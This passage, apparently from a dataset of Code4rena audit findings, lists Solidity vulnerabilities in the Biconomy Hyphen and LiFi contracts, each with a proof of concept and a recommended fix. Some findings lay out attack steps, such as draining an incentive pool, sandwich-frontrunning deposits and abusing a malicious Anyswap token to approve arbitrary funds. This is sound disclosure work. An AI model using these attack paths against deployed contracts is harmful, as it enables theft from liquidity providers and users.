Even if the manual step of calling the `getMaxCommunityLpPositon()` function is properly performed, it is possible for a user to add liquidity to increase the `maxLp` value in between when the `getMaxCommunityLpPositon()` function is called and when the `setPerTokenWalletCap()` function is called. Because this process is manual, this doesn't need to be bot frontrunning in the same block as when the `setPerTokenWalletCap()` function is called, but can be cause by poor timing of an innocent unknowing user adding liquidity to the protocol. If this condition occurs, the liquidity provider will have provided more liquidity than the perTokenWalletCap limit, breaking the assumptions for this variable and leading to some denial of service conditions.

This edge situation can impact the `setTotalCap()` function and the ""perTokenTotalCap\[\_token]"" state variable as well, but the ""perTokenWalletCap\[\_token]"" value would have to be reduced before the ""perTokenTotalCap\[\_token]"" value is reduced. The impact to `setTotalCap()` follows the same execution path but adds the additional step of calling the `setTotalCap()` function at the end of the process.

### Proof of Concept

1.  Owner [calls `getMaxCommunityLpPositon(_token)` function](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/WhitelistPeriodManager.sol#L245-L255) to identify maxLp value to confirm new perTokenWalletCap value is below maxLp value
2.  An innocent user adds liquidity to their position without the knowledge that the owner is going to reduce the ""perTokenWalletCap\[\_token]"" value soon
3.  Owner [calls `setPerTokenWalletCap()` function ](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/WhitelistPeriodManager.sol#L202-L208)to reduce ""perTokenWalletCap\[\_token]"" value
4.  The innocent user has more liquidity than the new ""perTokenWalletCap\[\_token]"" value. This means that the user can be in a situation where if they remove x amount of liquidity and attempt to add x liquidity back to their position, the innocent user will be unable to do so. Other functions that rely on the assumption that the largest user deposit is below the ""perTokenWalletCap\[\_token]"" value may break due to incorrect assumptions

This edge situation can impact the `setTotalCap()` function and the ""perTokenTotalCap\[\_token]"" state variable as well, but the ""perTokenWalletCap\[\_token]"" value would have to be reduced before the ""perTokenTotalCap\[\_token]"" value is reduced. The impact to `setTotalCap()` follows the same execution path but adds the additional step of calling the `setTotalCap()` function at the end of the process.

### Recommended Mitigation Steps

A programmatic solution is the only way to avoid these edge case scenarios, though it will increase gas consumption. To convert the manual calling of `getMaxCommunityLpPositon(_token)` to a programmatic solution, add the following require statement next to the existing require statement of the `setPerTokenWalletCap()` function:<br>
`require(_perTokenWalletCap <= getMaxCommunityLpPositon(_token), ""ERR_PWC_GT_MCLP"");`






***"
97.md,DoS by gas limit,medium,"[LiquidityFarming.sol#L220](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L220)<br>
[LiquidityFarming.sol#L233](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityFarming.sol#L233)<br>

In `deposit` function it is possible to push to `nftIdsStaked` of anyone, an attacker can deposit too many nfts to another user, and when the user will try to withdraw an nft at the end of the list, they will iterate on the list and revert because of gas limit.





***"
97.md,Sending tokens close to the maximum will fail and user will lose tokens,medium,"[LiquidityPool.sol#L171](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L171)<br>
[LiquidityPool.sol#L273](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L273)<br>

When a user calls the deposit function the reward amount is calculated and an event is emited with amount+reward as the transfer amount. The function checks amount is smaller than the max amount.

An executor then listens to this event and calls sendFundsToUser with rewards + amount as the amount parameter. This function checks amount+reward is smaller than max amount.

This is a problem because the amount transferred may be in the limit but amount + reward could pass the limit and the executor won't be able to send the transaction. The user will lose the funds. Both checks should be made with the reward or without the reward but the checks should be the same for this not to happen.

Step by step :<br>
Max transfer is set to 50 for token A<br>
Bob transfers 49 tokens, this will pass since 49<50. The reward is calculated in 2 tokens.<br>
The executor then calls sendFundsToUser with 52. This transaction will revert and user will lose their tokens.<br>

This value of amount includes rewards but the previous check didn't include rewards: [LiquidityPool.sol#L273](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L273).

### Recommended Mitigation Steps

Both checks should be made over the same amount = amount + rewards





***"
97.md,Incentive Pool can be drained without rebalancing the pool,medium,"[LiquidityPool.sol#L149-L173](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L149-L173)<br>
[LiquidityPool.sol#L263-L277](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L263-L277)<br>

`depositErc20` allows an attacker to specify the destination chain to be the same as the source chain and the receiver account to be the same as the caller account. This enables an attacker to drain the incentive pool without rebalancing the pool back to the equilibrium state.

### Proof of Concept

This requires the attacker to have some collateral, to begin with. The profit also depends on how much the attacker has. Assume the attacker has enough assets.

In each chain, when the pool is very deficit (e.g. `currentLiquidity` is much less than `providedLiquidity`), which often mean there's a good amount in the Incentive pool after some high valued transfers, then do the following.

*   step 1 :  borrow the liquidityDifference amount such that one can get the whole incentivePool.

<!---->

                uint256 liquidityDifference = providedLiquidity - currentLiquidity;
                if (amount >= liquidityDifference) {
                    rewardAmount = incentivePool[tokenAddress];

*   step 2 : call `depositErc20()` with `toChainId` being the same chain and `receiver` being `msg.sender`.

The executor will call `sendFundsToUser` to msg.sender. Then a rewardAmount, equivalent to the entire incentive pool (up to 10% of the total pool value), will be added to `msg.sender` minus equilibrium fee (\~0.01%) and gas fee.

In the end, the pool is back to the deficit state as before, the incentive pool is drained and the exploiter pockets the difference of rewardAmount minus fees.

This attack can be repeated on each deployed chain multiple times whenever the incentive pool is profitable (particularly right after a big transfer).

### Recommended Mitigation Steps

*   Disallow `toChainId` to be the source chain by validating it in `depositErc20` or in `sendFundsToUser` validate that `fromChainId` is not the same as current chain.

*   Require `receiver` is not `msg.sender` in `depositErc20`.






***"
97.md,Improper Upper Bound Definition on the Fee,medium,"The **equilibriumFee** and **maxFee** does not have any upper or lower bounds. Values that are too large will lead to reversions in several critical functions or the LP user will lost all funds when paying the fee.

### Proof of Concept

1.  Navigate to the following contract.

[TokenManager.sol#L52](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/token/TokenManager.sol#L52)<br>

2.  Owner can identify fee amount. That directly affect to LP management. [LiquidityPool.sol#L352](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityPool.sol#L352)

3.  Here you can see there is no upper bound has been defined.

```
    function changeFee(
        address tokenAddress,
        uint256 _equilibriumFee,
        uint256 _maxFee
    ) external override onlyOwner whenNotPaused {
        require(_equilibriumFee != 0, ""Equilibrium Fee cannot be 0"");
        require(_maxFee != 0, ""Max Fee cannot be 0"");
        tokensInfo[tokenAddress].equilibriumFee = _equilibriumFee;
        tokensInfo[tokenAddress].maxFee = _maxFee;
        emit FeeChanged(tokenAddress, tokensInfo[tokenAddress].equilibriumFee, tokensInfo[tokenAddress].maxFee);
    }

```

### Recommended Mitigation Steps

Consider defining upper and lower bounds on the **equilibriumFee** and **maxFee**.





***"
97.md,Call to non-existing contracts returns success,medium,"[LiquidityFarming.sol#L140](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityFarming.sol#L140)<br>
[LiquidityFarming.sol#L145](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityFarming.sol#L145)<br>
[LiquidityFarming.sol#L187](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityFarming.sol#L187)<br>

Low level calls (call, delegate call and static call) return success if the called contract doesn’t exist (not deployed or destructed).

This makes a user be able to send his funds to non-existing addresses.

`LiquidityFarming`<br>
`reclaimTokens` - if the owner calls by accident with a non-existing address he'll lose the funds.<br>
`_sendRewardsForNft` - if the `withdraw` or `extractRewards` will be called with a `to` non-existing address, the funds will be lost. That's because of the call to `_sendRewardsForNft` which contains a low level call to the `to` address.<br>

`sendFundsToUser` - if an executor calls by accident with a non-existing address the funds will be lost.<br>
`transfer` - if the `transfer` function will be called (by the LiquidityProvidors contract of course) with a non existing address as a receiver, the funds will be lost.<br>

This can be seen here <https://github.com/Uniswap/v3-core/blob/main/audits/tob/audit.pdf> (report #9) and here <https://docs.soliditylang.org/en/develop/control-structures.html#error-handling-assert-require-revert-and-exceptions>





***"
97.md,`LiquidityProviders`: Setting new liquidity pool will break contract,medium,"[LiquidityProviders.sol#L171](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityProviders.sol#L171)<br>

Owners can change the `liquidityPool` variable any time with the `setLiquidityPool` function.<br>
If a liquidity pool was already set and users added liquidity with `addTokenLiquidity`, the tokens are directly transferred to the liquidity pool and not kept in the `LiquidityProviders` contract.<br>
Changing the `liquidityPool` to a different contract will make it impossible for the users to withdraw their liquidity using `removeLiquidity` because the tokens are still in the old `liquidityPool` and cannot be retrieved.<br>

All users will lose their funds.

### Recommended Mitigation Steps

Changing the `liquidityPool` requires a sophisticated migration mechanism.<br>
Only allow setting the `liquidityPool` contract once.






***"
97.md,`LiquidityProviders`: Setting new LP token will break contract,medium,"[LiquidityProviders.sol#L116](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityProviders.sol#L116)<br>

Owners can change the `lpToken` variable at any time with the `setLpToken` function.<br>
If an LP token was already set and users added liquidity with `addTokenLiquidity` and were minted a `lpToken` NFT, changing the `lpToken` to a different contract will make it impossible for the users to withdraw their liquidity using `removeLiquidity`.<br>

All users will lose their funds.

### Recommended Mitigation Steps

Changing the `lpToken` requires a sophisticated migration mechanism.<br>
Only allow setting the `lpToken` contract once.






***"
97.md,Improper `tokenGasPrice` design can overcharge user for the gas cost by a huge margin,medium,"[LiquidityPool.sol#L330-L337](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L330-L337)<br>

```solidity
uint256 totalGasUsed = initialGas - gasleft();
totalGasUsed = totalGasUsed + tokenManager.getTokensInfo(tokenAddress).transferOverhead;
totalGasUsed = totalGasUsed + baseGas;

uint256 gasFee = totalGasUsed * tokenGasPrice;
gasFeeAccumulatedByToken[tokenAddress] = gasFeeAccumulatedByToken[tokenAddress] + gasFee;
gasFeeAccumulated[tokenAddress][_msgSender()] = gasFeeAccumulated[tokenAddress][_msgSender()] + gasFee;
amountToTransfer = amount - (transferFeeAmount + gasFee);
```

When the `Executor` calls `sendFundsToUser()`, the `tokenGasPrice` will be used to calculate the gas fee for this transaction and it will be deducted from the transfer amount.

However, since `tokenGasPrice` is `uint256`, the smallest chargeable amount is `1 wei` Token for `1 gas`. But there are tokens like `WBTC` (decimals = 8) or `USDC` (decimals = 6), for these tokens, even `1 wei` of the token can be worth a lot of gas, if the `tokenGasPrice` is set to `1`, `gasFee` will far more than the actual cost; if it's set to `0`, `gasFee` can only be `0`.

### Proof of Concept

Given:

*   `baseGas` = 21000
*   `tokenGasPrice` for WBTC = `1 wei`
*   `transferFeeAmount` = 0
*   1 WBTC = 20,000 MATIC

1.  Alice send `0.1 WBTC` to Bob's address on Polygon
2.  `Executor` calls `sendFundsToUser()` with `tokenGasPrice` = `1` on Polygon, `totalGasUsed` = `42000` and the gas price is `30G wei`, `Executor` paid `0.00126 MATIC` for gas.

```solidity
uint256 gasFee = 42000 * 1;
...
amountToTransfer = 10000000 - (0 + 42000);
```

3.  Bob received 0.09958 WBTC, and paid `0.00042 WBTC` for the gas, the gas fee was overcharged by 6666 times.

### Recommended Mitigation Steps

Consider changing `tokenGasPrice` to a value with decimals of `18` and it should be used like this:

```solidity
uint256 gasFee = totalGasUsed * tokenGasPrice / 1e18;
```





***"
97.md,`LiquidityFarming.sol` Unbounded for loops can potentially freeze users' funds in edge cases,medium,"In the current implementation of `withdraw()`, it calls `_sendRewardsForNft()` at L243 which calls `updatePool()` at L129 which calls `getUpdatedAccTokenPerShare()` at L319.

`getUpdatedAccTokenPerShare()` will loop over `rewardRateLog` to calculate an up to date value of accTokenPerShare.

[LiquidityFarming.sol#L270-L285](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityFarming.sol#L270-L285)<br>

```solidity
while (true) {
    if (lastUpdatedTime >= counter) {
        break;
    }
    unchecked {
        accumulator +=
            rewardRateLog[_baseToken][i].rewardsPerSecond *
            (counter - max(lastUpdatedTime, rewardRateLog[_baseToken][i].timestamp));
    }
    counter = rewardRateLog[_baseToken][i].timestamp;
    if (i == 0) {
        break;
    }
    --i;
}
```

This won't be a problem in the usual cases, however, if there is a baseToken that:

*   the `rewardPerSecond` get updated quite frequently;
*   the liquidityProviders are inactive (no deposits / withdrawals for a period of time)

Then by the time one of the `liquidityProviders` come to `withdraw()`, the tx may revert due to out-of-gas.

As the `rewardRateLog` is now accumulated to a large size that causes the loop costs more gas than the block gas limit.

There is a really easy fix for this, it will also make the code simpler:

### Recommended Mitigation Steps

Consider removing `rewardRateLog` and change `setRewardPerSecond()` to:

```solidity
function setRewardPerSecond(address _baseToken, uint256 _rewardPerSecond) public onlyOwner {
    updatePool(baseToken);
    rewardRate[_baseToken] = RewardsPerSecondEntry(_rewardPerSecond, block.timestamp);
    emit LogRewardPerSecond(_baseToken, _rewardPerSecond);
}
```






***"
97.md,`WhitelistPeriodManager`: Improper state handling of exclusion removals,medium,"[WhitelistPeriodManager.sol#L178-L184](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L178-L184)<br>
[WhitelistPeriodManager.sol#L115-L125](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L115-L125)<br>

The `totalLiquidity` and `totalLiquidityByLp` mappings are not updated when an address is removed from the `isExcludedAddress` mapping. While this affects the enforcement of the cap limits and the `getMaxCommunityLpPositon()` function, the worst impact this has is that the address cannot have liquidity removed / transferred due to subtraction overflow.

In particular, users can be prevented from withdrawing their staked LP tokens from the liquidity farming contract should it become non-excluded.

### Proof of Concept

*   Assume liquidity farming address `0xA` is excluded
*   Bob stakes his LP token
*   Liquidity farming contract is no longer to be excluded: `setIsExcludedAddressStatus([0xA, false])`
*   Bob attempts to withdraw liquidity → reverts because `totalLiquidityByLp[USDC][0xA] = 0`, resulting in subtraction overflow.

```jsx
// insert test case in Withdraw test block of LiquidityFarming.tests.ts
it.only('will brick withdrawals by no longer excluding farming contract', async () => {
  await farmingContract.deposit(1, bob.address);
  await wlpm.setIsExcludedAddressStatus([farmingContract.address], [false]);
  await farmingContract.connect(bob).withdraw(1, bob.address);
});

// results in
// Error: VM Exception while processing transaction: reverted with panic code 0x11 (Arithmetic operation underflowed or overflowed outside of an unchecked block)
```

### Recommended Mitigation Steps

The simplest way is to prevent exclusion removals.

```jsx
function setIsExcludedAddresses(address[] memory _addresses) external onlyOwner {
  for (uint256 i = 0; i < _addresses.length; ++i) {
    isExcludedAddress[_addresses[i]] = true;
    // emit event
    emit AddressExcluded(_addresses[i]);
  }
}
```






***"
97.md,`WhitelistPeriodManager`: Improper state handling of exclusion additions,medium,"[WhitelistPeriodManager.sol#L178-L184](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L178-L184)<br>
[WhitelistPeriodManager.sol#L83-L99](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/WhitelistPeriodManager.sol#L83-L99)<br>

The `totalLiquidity` and `totalLiquidityByLp` mappings are not updated when an address is added to the `isExcludedAddress` mapping. This affects the enforcement of the cap limits and the `getMaxCommunityLpPositon()` function, which implicitly assumes that whitelisted addresses will have 0 liquidity, for addresses with non-zero liquidity at the time of addition to the whitelist.

### Proof of Concept

*   Assume the following initial conditions:
    *   Alice’s address `0xA` is the sole USDC liquidity provider
        *   `totalLiquidity[USDC] = 500`
        *   `totalLiquidity[USDC][0xA] = 500`
    *   USDC total cap of `500`, ie. `perTokenTotalCap[USDC] = 500`
*   Exclude Alice’s address `0xA`: `setIsExcludedAddressStatus([0xA, true])`
    *   totalLiquidity mappings are unchanged
*   The following deviant behaviour is observed:
    *   `getMaxCommunityLpPositon()` returns `500` when it should return `0`
    *   All non-excluded addresses are unable to provide liquidity when they should have been able to, as Alice’s liquidity should have been excluded.
    ```jsx
    // insert test case in WhitelistPeriodManager.test.ts
    describe.only(""Test whitelist addition"", async () => {
      it('produces deviant behaviour if excluding address with existing liquidity', async () => {
        await wlpm.setCaps([token.address], [500], [500]);
        await liquidityProviders.connect(owner).addTokenLiquidity(token.address, 500);
        await wlpm.setIsExcludedAddressStatus([owner.address], [true]);
        // 1) returns 500 instead of 0
        console.log((await wlpm.getMaxCommunityLpPositon(token.address)).toString());
        // 2) bob (or other non-excluded addresses) will be unable to add liquidity
        await expect(liquidityProviders.connect(bob).addTokenLiquidity(token.address, 1)).to.be.revertedWith('ERR__LIQUIDITY_EXCEEDS_PTTC');
      });
    });
    ```

### Recommended Mitigation Steps

Check that the address to be excluded is not holding any LP token at the time of exclusion.

```jsx
// in setIsExcludedAddressStatus()
for (uint256 i = 0; i < _addresses.length; ++i) {
  if (_status[i]) {
    require(lpToken.balanceOf(_addresses[i]) == 0, 'address has existing liquidity');
  }
  ...
}
```






***"
97.md,wrong condition checking in price calculation,medium,"[LiquidityProviders.sol#L180-L186](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityProviders.sol#L180-L186)<br>

The `getTokenPriceInLPShares` function calculates the token price in LP shares, but it checks a wrong condition - if supposed to return `BASE_DIVISOR` if the total reserve is zero, not if the total shares minted is zero. This might leads to a case where the price is calculated incorrectly, or a division by zero is happening.

### Proof of Concept

This is the wrong function implementation:

```sol
function getTokenPriceInLPShares(address _baseToken) public view returns (uint256) {
    uint256 supply = totalSharesMinted[_baseToken];
    if (supply > 0) {
        return totalSharesMinted[_baseToken] / totalReserve[_baseToken];
    }
    return BASE_DIVISOR;
}
```

This function is used in this contract only in the removeLiquidity and claimFee function, so it's called only if funds were already deposited and totalReserve is not zero, but it can be problematic when other contracts will use this function (it's a public view function so it might get called from outside of the contract).

### Recommended Mitigation Steps

The correct code should be:

```sol
function getTokenPriceInLPShares(address _baseToken) public view returns (uint256) {
    uint256 reserve = totalReserve[_baseToken];
    if (reserve > 0) {
        return totalSharesMinted[_baseToken] / totalReserve[_baseToken];
    }
    return BASE_DIVISOR;
}
```







***"
97.md,Possible frontrun on deposits on `LiquidityPool`,medium,"*Submitted by Cantor_Dust, also found by WatchPug*

Rewards are given to a user for depositing either ERC20 tokens or their native token into the LiquidityPool. This reward is used to incentivize users to deposit funds into the liquidity pool when the pool is not in an equilibrium state.

For regular users, this liquidity pool state fluctuates based on the frequency and amount of deposits made to the liquidity pool. If a malicious user can control the state of the liquidity pool before a victim deposits tokens into the liquidity pool, they can gain double rewards.

To gain these double rewards, a malicious user can watch the mempool for transactions that will receive a reward when the deposit occurs. When a malicious user sees that victim deposit, the malicious user can attach a higher fee to their transaction and initiate a deposit. This will allow the malicious user's transaction to front-run before the victim's transaction.

Once the malicious user's deposit is complete, the liquidity pool state will be in a near equilibrium state. Then, the victim's deposit will occur which causes the liquidity pool state to no longer be in equilibrium.

Finally, the malicious user will make a final deposit gaining yet another reward for bringing the liquidity pool state back to equilibrium.

To sum up, a malicious user can create a sandwich attack where they deposit their own tokens before and after a victim's transaction. This will allow the malicious user to double dip and gain rewards twice due to victim's deposit.

### Proof of Concept

Let's look at the depositNative function which is the simpler of the two deposit functions.

The key component in the depositNative function is the getRewardAmount which can be found [here](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L255). The getRewardAmount calculates how much available vs supplied liquidity exists in the liquidity pool. [Here](https://github.com/code-423n4/2022-03-biconomy/blob/main/contracts/hyphen/LiquidityPool.sol#L175-L188) there are no time-weighted checks to calculate the available vs. supplied liquidity. With a lack of checks for time-weight and that there are no frontrun checks against deposits, it's trivial to front-run deposits and control the liquidity of the liquidity such that the reward amount can be double-dipped.

### Recommended Mitigation Steps

1.  By allowing each deposit to manipulate the liquidity pool state from either a deficient or excessive state, malicious users can double dip on rewards.
2.  Alternative approaches to calculating rewards is possible, for example a dutch auction style deposit system where rewards are distributed evenly could reduce an impact of a frontrun attack.
3.  A simpler approach is to record liquidity states at specific block timestamps and check against the timestamp for the current block state.






***"
97.md,`sharesToTokenAmount`: Division by zero,medium,"[LiquidityProviders.sol#L192](https://github.com/code-423n4/2022-03-biconomy/blob/db8a1fdddd02e8cc209a4c73ffbb3de210e4a81a/contracts/hyphen/LiquidityProviders.sol#L192)<br>

The public `sharesToTokenAmount` function does not check if the denominator `totalSharesMinted[_tokenAddress]` is zero.<br>
Neither do the callers of this function. The function will revert.<br>
Calling functions like `getFeeAccumulatedOnNft` and `sharesToTokenAmount` from another contract should never revert.<br>

### Recommended Mitigation Steps

Return 0 in case `totalSharesMinted[_tokenAddress]` is zero.






***"
97.md,Liquidity providers unable to remove liquidity when the pool is in deficit state,medium,"[LiquidityProviders.sol#L388](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityProviders.sol#L388)<br>
[LiquidityProviders.sol#L392](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityProviders.sol#L392)<br>

LP token holders can not redeem their tokens when the pool is in the deficit state, i.e. `currentLiquidity << providedLiquidity`. This is due to that LP shares are computed based on `providedLiquidity` and the actual available pool balance is based on `currentLiquidity`.

### Proof of Concept

When a high valued withdrawal happens in the liquidity pool of the destination chain, the current liquidity will be reduced when the executor calls `sendFundsToUser`<br>
[LiquidityPool.sol#L285](https://github.com/code-423n4/2022-03-biconomy/blob/04751283f85c9fc94fb644ff2b489ec339cd9ffc/contracts/hyphen/LiquidityPool.sol#L285)<br>

and the pool contract balance will also be reduced by the same amount. The pool reached a deficit state with provided liquidity much bigger than current liquidity.

The LP shares are computed based on the value of `totalReserve` that is roughly equivalent to `totalLiquidity + LpFees`. In a deficit state, `totalReserve` could be much bigger than the available pool balance (up to 90% since max fee is 10%).
If the LP token holder wants to redeem his shares,

            _decreaseCurrentLiquidity(_tokenAddress, _amount);

will underflow and revert and

            _transferFromLiquidityPool(_tokenAddress, _msgSender(), amountToWithdraw);

will revert because there is not enough balance.

### Recommended Mitigation Steps

This is a tricky problem. On one hand, separating `currentLiquidity` from `providedLiquidity` made sure that by bridging tokens over, it will not inflate or deflate the pool. On the other hand, decoupling the two made it hard to compute the actual available liquidity to redeem LP shares. One may need to think through this a bit more.





***"
103.md,Reliance on `lifiData.receivingAssetId` can cause loss of funds,high,"[GenericSwapFacet.sol#L23-L30](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/GenericSwapFacet.sol#L23-L30)<br>

In the `swapTokensGeneric()` function, an arbitrary number of swaps can be performed from and to various tokens. However, the final balance that is sent to the user relies on `_lifiData.receivingAssetId` which has no use in the swapping functionality. LifiData is claimed to be used purely for analytical reasons per the comments to this function. If this value is input incorrectly, the swapped tokens will simply sit in the contract and be lost to the user.

### Proof of Concept

Imagine a call to `swapTokensGeneric()` with the following parameters (excluding unnecessary parameters for this example):

*   LifiData.receivingAssetId = '0xUSDC_ADDRESS'

Single SwapData array:

*   LibSwap.SwapData.sendingAssetId = '0xWETH_ADDRESS'
*   LibSwap.SwapData.receivingAssetId = '0xDAI_ADDRESS'

Since the `receivingAssetId` from `SwapData` does not match the `receivingAssetId` from `LifiData`, the final funds will not be sent to the user after the swap is complete, based on the following lines of code:

    uint256 receivingAssetIdBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId);

     _executeSwaps(_lifiData, _swapData);

     uint256 postSwapBalance = LibAsset.getOwnBalance(_lifiData.receivingAssetId) - receivingAssetIdBalance;

     LibAsset.transferAsset(_lifiData.receivingAssetId, payable(msg.sender), postSwapBalance);

Lines 1, 3, and 4 reference `LifiData.receivingAssetId` and handle the transfer of funds following the swaps. Line 2 performs the swap, referencing `SwapData.receivingAssetId` as can be seen in the `executeSwaps()` function definition:

    function _executeSwaps(LiFiData memory _lifiData, LibSwap.SwapData[] calldata _swapData) internal {
            // Swap
            for (uint8 i; i < _swapData.length; i++) {
                require(
                    ls.dexWhitelist[_swapData[i].approveTo] == true && ls.dexWhitelist[_swapData[i].callTo] == true,
                    ""Contract call not allowed!""
                );

                LibSwap.swap(_lifiData.transactionId, _swapData[i]);
            }
        }

### Recommended Mitigation Steps

I recommend adding a check that `_lifiData.receivingAssetId` equals the `receivingAssetId` of the last index of the SwapData array, or simply use the `receivingAssetId` of the last index of the SwapData array for sending the final tokens to the user.





***"
103.md,All swapping functions lack checks for returned tokens,high,"[GenericSwapFacet.sol#L23-L30](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Facets/GenericSwapFacet.sol#L23-L30)<br>
[LibSwap.sol#L48](https://github.com/code-423n4/2022-03-lifinance/blob/699c2305fcfb6fe8862b75b26d1d8a2f46a551e6/src/Libraries/LibSwap.sol#L48)<br>

Every function that stems from the `GenericSwapFacet` lacks checks to ensure that some tokens have been returned via the swaps. In `LibSwap.sol` in the `swap()` function, the swap call is sent to the target DEX. A return of success is required, otherwise the operation will revert.

Each ""inner"" swap via `LibSwap.sol` lacks output checks and also the ""outer"" `swapTokensGeneric()` via `GenericSwapFacet.sol` lacks a final check as well.

There is a possibility that the calldata is accidently populated with a function in the target router that is not actually performing any swapping functionality, `getAmountsOut()` for example. The function will return true, but no new returned tokens will be present in the contract. Meanwhile, the contract has already received the user's `fromTokens` directly.

### Recommended Mitigation Steps

This would be a potential use case of using function signature whitelists as opposed to contract address whitelists, as noted as a possibility by the LiFi team.

Otherwise, the following `require` statement in `swapTokensGeneric()` would ensure that at least a single token was received:

`require(LibAsset.getOwnBalance(_swapData.receivingAssetId) - toAmount) > 0, ""No tokens received"")`





***"
103.md,`AnyswapFacet` can be exploited to approve arbitrary tokens.,medium,"*Submitted by kirk-baird, also found by cccz, dirk\_y, hickuphh3, and rayn*

[AnyswapFacet.sol#L35-L53](https://github.com/code-423n4/2022-03-lifinance/blob/main/src/Facets/AnyswapFacet.sol#L35-L53)<br>

In `AnyswapFacet.sol` we parse arbitrary data in `_anyswapData` allowing an attacker to drain funds (ERC20 or native tokens) from the LiFi contract.

Functions effected:

*   `AnyswapFacet.startBridgeTokensViaAnyswap()`
*   `AnyswapFacet.swapAndStartBridgeTokensViaAnyswap()`

### Proof of Concept

This attack works in `AnyswapFacet.startBridgeTokensViaAnyswap()` by having a malicious `_anyswapData.token` which may change the value return in `IAnyswapToken(_anyswapData.token).underlying();`.

First we have the first call to `IAnyswapToken(_anyswapData.token).underlying();` return a malicious ERC20 contract in the attackers control. This allows for transferring these malicious ERC20 tokens to pass the required balance checks.

                uint256 _fromTokenBalance = LibAsset.getOwnBalance(underlyingToken);
                LibAsset.transferFromERC20(underlyingToken, msg.sender, address(this), _anyswapData.amount);

                require(
                    LibAsset.getOwnBalance(underlyingToken) - _fromTokenBalance == _anyswapData.amount,
                    ""ERR_INVALID_AMOUNT""
                );

The function will then call `_startBridge()` which again does `address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();` we have the malicious `_anyswapData.token` return a different address, one which the LiFi contract has balance for (a native token or ERC20).

We will therefore execute the following which will either approve or transfer funds to `_anyswapData.router` for a different `underlyingtoken` to the one which supplied the funds to LiFi.

            address underlyingToken = IAnyswapToken(_anyswapData.token).underlying();

            if (underlyingToken == IAnyswapRouter(_anyswapData.router).wNATIVE()) {
                IAnyswapRouter(_anyswapData.router).anySwapOutNative{ value: _anyswapData.amount }(
                    _anyswapData.token,
                    _anyswapData.recipient,
                    _anyswapData.toChainId
                );
                return;
            }

            if (_anyswapData.token != address(0)) {
                // Has underlying token?
                if (underlyingToken != address(0)) {
                    // Give Anyswap approval to bridge tokens
                    LibAsset.approveERC20(IERC20(underlyingToken), _anyswapData.router, _anyswapData.amount);

                    IAnyswapRouter(_anyswapData.router).anySwapOutUnderlying(
                        _anyswapData.token,
                        _anyswapData.recipient,
                        _anyswapData.amount,
                        _anyswapData.toChainId
                    );
                } else {
                    // Give Anyswap approval to bridge tokens
                    LibAsset.approveERC20(IERC20(_anyswapData.token), _anyswapData.router, _anyswapData.amount);

                    IAnyswapRouter(_anyswapData.router).anySwapOut(
                        _anyswapData.token,
                        _anyswapData.recipient,
                        _anyswapData.amount,
                        _anyswapData.toChainId
                    );
                }
            }
        }

Since `_anyswapData.router` is an address in the attackers control they either are transferred native tokens or they have an allowance of ERC20 tokens that they can spend arbitrarily.

The attack is almost identical in `swapAndStartBridgeTokensViaAnyswap()`

### Recommended Mitigation Steps

Consider whitelisting both Anyswap tokens and Anyswap routers (using two distinct whitelists) restricting the attackers ability to use malicious contracts for this attack.

Consider also only calling `IAnyswapToken(_anyswapData.token).underlying()` once and passing this value to `_startBridge()`.





***"
